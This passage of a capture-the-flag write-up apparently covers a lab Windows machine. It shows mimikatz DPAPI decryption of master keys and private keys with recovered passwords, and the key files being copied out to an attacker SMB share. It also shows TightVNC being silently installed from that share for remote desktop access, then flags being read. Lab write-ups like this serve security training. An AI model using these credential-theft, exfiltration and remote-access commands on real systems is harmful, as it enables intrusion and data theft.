    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {9e78687d-d881-4ccb-8bd8-bc0a19608687}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 00000018 - 24
    szDescription      : Export Flag
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : d4a8381b8847c218242b61555a4d0d78b68659dd782e674408187bf52f7d171b
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : b6a835d975bb90aae24e128640f5459fad3cb4f418ea176acd83b25ac5828053
    dwDataLen          : 00000010 - 16
    pbData             : 07aecb012bb7f55c03ada7069f49df4c
    dwSignLen          : 00000040 - 64
    pbSign             : 1a7d25a9be8bbe328ae80b35be2d88ca63acbe4716724ac11d3c95de841e684bf56ebbafccc60fb9c07fc0c481abcd10e37c8de73e0c4905a596eed2ece22fcb

```

From that, I’ll also see the private key is encrypted with the masterkey `9e78687d-d881-4ccb-8bd8-bc0a19608687`.

#### Decrypt The masterkey

I’ll use that guid to find the encrypted masterkey in `C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-500`:

```

C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-500>dir /a
dir /a
 Volume in drive C has no label.
 Volume Serial Number is D258-5C3B

 Directory of C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-500

12/23/2018  08:54 PM    <DIR>          .
12/23/2018  08:54 PM    <DIR>          ..
12/20/2018  10:07 PM               468 61349c38-5618-45f3-8d0d-8f3b24e3e718
12/23/2018  08:54 PM               468 9e78687d-d881-4ccb-8bd8-bc0a19608687
12/23/2018  08:54 PM                24 Preferred
               3 File(s)            960 bytes
               2 Dir(s)   5,778,624,512 bytes free

```

I can use `mimikatz` with the password to decrypt the key:

```

mimikatz # dpapi::masterkey /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-500\9e78687d-d881-4ccb-8bd8-bc0a19608687" /password:mb@letmein@SERVER#acc
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {9e78687d-d881-4ccb-8bd8-bc0a19608687}
  dwFlags            : 00000005 - 5
  dwMasterKeyLen     : 000000b0 - 176
  dwBackupKeyLen     : 00000090 - 144
  dwCredHistLen      : 00000014 - 20
  dwDomainKeyLen     : 00000000 - 0
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 98767ea007dc468e6bc59c9ff8e666f5
    rounds           : 00001f40 - 8000
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 7a25ca58aab56dcc924214a1076381e3aabe1ddfc3504fee7c0a07ab67375c1d892a54cf5bb4470079118dbb4534dcc73f180733c614d767b71709d75f361e7cf156113b2ea8841ccf08bdba2d8ac22ef1920cbf922f36fc44671e56438758dc03c481ee654361521539bef11213bd3bf0a8d76efa9e35722578111b21700c773af7224635b6708e127edcd3a9ab245a

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : df20ce5c344410a535b5307e6e4c095f
    rounds           : 00001f40 - 8000
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 3e75b3e7d8dc0f04b7dc992409af01211ad82095847031dbf57ffddafce991b90f9c06854c8a40523eb10ad6f712431b986717461b4c66ab3210189e00ba760cc3ea29c352e9fcf4d2827005a886d1d6d854d76ec5b9286d0acaba0326ae67d9e88762698f136bc8bf7e88a8ba1e5c21                        

[credhist]
  **CREDHIST INFO**
    dwVersion        : 00000003 - 3
    guid             : {712edeb8-1bb0-40a4-892c-5b3618e32d3f}

Auto SID from path seems to be: S-1-5-21-3107372852-1132949149-763516304-500

[masterkey] with password: mb@letmein@SERVER#acc (normal user)
  key : 8ed6519c4d09a506504c4f611203bea8979a385f8a444fe57b5d2256ee1e4eb34392a141f502cd9aeea8d2187c2525c3ae998dc3cebad81cc4e41dbb6bc65fa8
  sha1: b18974052cb509a86a008869fd95388550678184

```

Now I have the masterkey (and it’s sha1).

#### Decrypt The Private Key

If I run the same command I ran earlier to get information on the private key, I’ll get more information now as `mimikatz` knows the masterkey:

```

mimikatz # dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-500\d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85"
...[snip same as before]...

Decrypting AT_EXCHANGE Export flags:
 * volatile cache: GUID:{9e78687d-d881-4ccb-8bd8-bc0a19608687};KeyHash:b18974052cb509a86a008869fd95388550678184
01000000
Decrypting AT_EXCHANGE Private Key:
 * volatile cache: GUID:{9e78687d-d881-4ccb-8bd8-bc0a19608687};KeyHash:b18974052cb509a86a008869fd95388550678184
525341320801000000080000ff000000010001003989b611716ee6a782d4e5b3354151663a8eaf657673c5319fc49ad07d065bd6c0db34c8b93578a479fa6726bdd5d4a1db35d48f3788058bf2c4ea4e55208fba96f8bc497bf6d47b9eece46de6a04d0776a0bdd2c1e2cc99ba47ae7cbe5512f916e5853755f4e07d5900f88bef3245f8ccf5cda963fe04248370d643bc869b084e5367ee154f077d4b92a54be796c7b141e25babc0982f99ed1efba9f513a0a5269cd87cee461ae44d262b5133763d52585e52c5ae6008618229985d4d024a968021427c5c1592f075325e7d17cb1b846e58d77671659d71f398ad7332b492017329bddbb3e46d176863542a42c6f9335b3d83924fb80673d41dea595d503cc30000000000000000b7d3795299c3fd3611963a4db2470d31257bf32889102a7af00bea55825ac4db6f1c0eefd3fac7cf71f5a6888e400f2978e90bff2d4fc1825af91f4eaf2e555608730ae2b09f440905893fe36e7f9ca871dc6c9866ade10b4af0a75b5ec1017440c8407fd5929022064c05f0c784c43c50db59fbd8f0ff50b681beca214536d8000000008feafca4fde98742bd8e9c8dc4926604b4f76809bdcac977d7db9f6042cf6667fc97f8bfbf2575c37b37db47a0a02c250711c6eb719d4185a65f3226779212128dfdff7036c782a3e23707c0330ea2fc82f07e5379f504dac816d5a20baad0bf2575908f7126c8259454c59c49393788a0d2c34ecd29f07c37bf60aa05d929e700000000dbdd4ed230d34426587fedda0e13d15d048b03ad0412dc788e1920ff633c00be8ba0f8766e0f0931079d33ce50c68b233834ac1cdeb2e73c5eaadcf1b0b239cbde98b0380e7a8cbd8ccea700c76a9adca8ee6e4905f6c42c88920926cd18cd7e34baf937421ded7777f41b1f4f232f52e6632021ab7cdc88d97e4ea31497fa1400000000b5c08643d31e1272c50b7ab72402c53bdb4c1462cd0dbe0c259172b2000c0e2d487d9b03680e0f9e6746142a8dfff71600df99ae962d7bfc2abcfc9d92fcd59a1a27954c4e7b8e51d4c1d08f38079eb7b5a5d2a633c408271cfa77be8c5bf66c2b0adff635144bed1d3e7693a89c6f3efef3fc3cc9fb538cac8836f8eac75eda00000000334c78111dd8e5a194368f16e1ac6194b6b2310eb16c294d9be3fd8bb48e24334f55c57201c96a85437b8bfa4bd4ecb062c6629e8e447f5c265289136630099d9967461a00639c3948afa95717b3701ee2f0f0843acaf4732d62383eca01c98d2877f162e5ee9a7cecadc98ea350c05201641136dd7dc606df23d0507c8f9bb000000000199158b9b978de249d5d43457bec8e729f784c3cca26116f85e794fcd3782ce448443af842d91568c1454a5489646fa8278339037143ee5f17628b5ebf7738cd7e5b6352daa49287fb70b5c0640a8ea2de9dd7209b892c3e235805b80517703a99301290f65196ffac5544e2bc818446310ee378e02193039ef83453cd79b3a46d810cb0013a534ef6dcc9ea9c4ea2a203dac20835f4ef9d9f5f4449c3ff717fec05cb524d2d975780e4d52014e880cadca63ebb5f24f9983e67f455bfb14d13ae5449dbe74135f6193754abadb72cf4a28fb6290eba47b2233fb4a4619b9ecd2ffb6a7da40ec1a319192c1df50631cf69ce8deb913a545663a7dee74dcc8bb400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000                                                                                                                                                               
        Exportable key : YES
        Key size       : 2048
        Private export : OK - 'raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk'

```

And now the `.pvk` file exists in the local directory:

```

C:\>dir \windows\system32\spool\drivers\color\*.pvk /b
raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk

```

I’ll copy that file back:

```

C:\>net use \\10.10.14.14\share /u:df df
The command completed successfully.

C:\>copy \windows\system32\spool\drivers\color\raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk \\10.10.14.14\share\
        1 file(s) copied.
        
C:\>copy \windows\system32\spool\drivers\color\FB154575993A250FE826DBAC79EF26C211CB77B3.der \\10.10.14.14\df\
        1 file(s) copied.

```

#### Build PFX

I’ll follow the instructions from the guide and create a `.pfx` file:

```

root@kali# openssl x509 -inform DER -outform PEM -in FB154575993A250FE826DBAC79EF26C211CB77B3.der -out root_public.pem
root@kali# openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk  -out root_private.pem
writing RSA key
root@kali# openssl pkcs12 -in root_public.pem -inkey root_private.pem -pass:0xdf -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out root_cert.pfx
pkcs12: Unrecognized flag pass:0xdf
pkcs12: Use -help for summary.
root@kali# openssl pkcs12 -in root_public.pem -inkey root_private.pem -password pass:0xdf -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out root_cert.pfx

```

#### Install PFX

Now I can copy that back to Helpline:

```

C:\>copy \\10.10.14.14\share\root_cert.pfx \windows\system32\spool\drivers\color\
        1 file(s) copied.

```

And install it:

```

C:\>certutil -user -p 0xdf -importpfx \windows\system32\spool\drivers\color\root_cert.pfx NoChain,NoRoot
Certificate "Administrator" added to store.

CertUtil: -importPFX command completed successfully.

```

#### Access root.txt

Now I can get the flag:

```

C:\>type users\administrator\desktop\root.txt
d814211f...

```

### user.txt

I can do the same process for `user.txt`. I’ll see it on tolu’s desktop:

```

C:\Users\tolu\Desktop>dir /b
user.txt

```

I’ve already got tolu’s has: `03e2ec7aa7e82e479be07ecd34f1603b`.

I can use `cipher` to get the Certificate thumbprint: `91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29`.

I can verify that Certificate exists:

```

C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates>dir /a /b
91EF5D08D1F7C60AA0E4CEE73E050639A6692F29

```

And run:

```

crypto::system /file:"C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29" /export

```

to export it and get the Key Container ID of `e65e6804-f9cd-4a35-b3c9-c3a72a162e4d`.

In `C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011`, I find a single key container, `307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85`.

`mimikatz` command of:

```

dpapi::capi /in:"C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85"

```

gives me a match on the `pUniqueName`, and gives me a masterkey of `2f452fc5-c6d2-4706-a4f7-1cd6b891c017`.

I can decrypt that key with the command (I’ll use the plaintext password from the logs this time to show a different way):

```

dpapi::masterkey /in:"C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017" /password:!zaq1234567890pl!99

```

I get a master password, which `mimikatz` now knows. I’ll run the `dpapi::capi` command again, and get `raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk`. Bring it and the cert back to kali, and create the `.pfx`. Move it back, and import:

```

C:\>certutil -user -p 0xdf -importpfx \windows\system32\spool\drivers\color\user_cert.pfx NoChain,NoRoot
certutil -user -p 0xdf -importpfx \windows\system32\spool\drivers\color\user_cert.pfx NoChain,NoRoot
Certificate "tolu" added to store.

CertUtil: -importPFX command completed successfully.

```

Now grab `user.txt`:

```

C:\>type users\tolu\desktop\user.txt
0d522fa8...

```

## VNC

jrk figured out another really cool way to make reading the EFS files easier - install VNC. He tried to connect over RDP, but wasn’t blocked from doing so. But when I install VNC, I can then connect to it rather easily.

### Install VNC

I’ll grab the latest x64 msi installer for TightVNC from their [downloads page](https://www.tightvnc.com/download.php), and I’ll drop it into a folder I’m sharing with `smbserver.py`.

Now, from my SYSTEM shell, I’ll run the following monster command:

```

E:\ManageEngine\ServiceDesk\integration\custom_scripts>msiexec /i "\\10.10.14.14\share\tightvnc-2.8.23-gpl-setup-64bit.msi" /quiet /norestart ADDLOCAL="Server,Viewer" VIEWER_ASSOCIATE_VNC_EXTENSION=1 SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 VIEWER_ADD_FIREWALL_EXCEPTION=1 SERVER_ALLOW_SAS=1 SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=PASSWORD SET_USECONTROLAUTHENTICATION=1 VALUE_OF_USECONTROLAUTHENTICATION=1 SET_CONTROLPASSWORD=1 VALUE_OF_CONTROLPASSWORD=PASSWORD

```

That tells Windows to run the `.msi` installer from my share using `msiexec` with options to start immediately, without a restart, opening the firewall, starting a service, and setting the control password to “PASSWORD”.

After running, it takes a minute for the port to open. But eventually it does:

```

root@kali# nmap -p 5900 10.10.10.132
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-14 15:44 EDT
Nmap scan report for 10.10.10.132
Host is up (0.031s latency).

PORT     STATE    SERVICE
5900/tcp filtered vnc

Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds

root@kali# nmap -p 5900 10.10.10.132
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-14 15:44 EDT
Nmap scan report for 10.10.10.132
Host is up (0.030s latency).

PORT     STATE SERVICE
5900/tcp open  vnc

Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds

```

### Connect

Now I’ll use the `vncviewer` application on kali to connect:

```

root@kali# vncviewer 10.10.10.132
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password:
Authentication successful
Desktop name "helpline"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0

```

When prompted for a password, I’ll enter “PASSWORD”. I’m granted access to the desktop:

![1565812389228](https://0xdfimages.gitlab.io/img/1565812389228.png)

I’ll scroll down and open a `cmd` window. I’m running as leo:

![1565812526718](https://0xdfimages.gitlab.io/img/1565812526718.png)

I can’t exactly explain why I’m leo. I know the box must have leo’s creds because it is running the scheduled task as leo. But why does the VNC service install as leo? If you know, please leave a comment.

### Flags

I can easily go to leo’s desktop, read `admin-pass.xml` and get the plain-text admin password. From there, I can start a terminal as administrator, and get `root.txt`:

[![root.txt via vnc](https://0xdfimages.gitlab.io/img/1565812938759.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1565812938759.png)

I can get the creds for tolu from the event logs, and then create a `cmd` as that user as well:

[![user.txt via vnc](https://0xdfimages.gitlab.io/img/1565813283135.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1565813283135.png)